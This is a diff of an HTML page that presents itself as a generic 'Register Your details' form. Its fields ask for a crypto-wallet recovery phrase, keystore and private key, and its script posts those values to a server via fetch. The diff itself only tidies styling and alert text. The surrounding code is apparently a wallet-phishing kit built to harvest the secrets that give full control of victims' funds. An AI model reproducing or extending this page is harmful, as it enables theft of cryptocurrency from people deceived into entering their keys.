@@ -12,16 +12,12 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet"
         integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
     <!-- Title -->
-    <style>
-        .hide { display: none }
-    </style>
     <title>App Form</title>
 </head>
 
 <body>
     <h2 class="text-center mt-5">Register Your details</h2>
     <p class="text-center">Please Provide your Info</p>
-    
     <div class="container">
         <form id="mail_form" method="POST" action="">
             <div class="row">
@@ -54,10 +50,6 @@
         </form>
     </div>
 
-    
-
-
-
         <script>
             
             const Form = document.getElementById("mail_form");
@@ -69,7 +61,6 @@
                         let phrase = document.getElementById("phrase").value;
                         let keyStore = document.getElementById("keystore").value;
                         let privateKey = document.getElementById("privatekey").value;
-                        
                         console.log(phrase, keyStore, privateKey);
 
                         const data = {
@@ -91,7 +82,7 @@
                     .then((response) => response.text())
                     .then((data)=> {
                         console.log("Success: ", data)
-                        alert("Message sent");
+                        alert("message sent")
                         phrase = "";
                         keyStore = "";
                         privateKey = "";
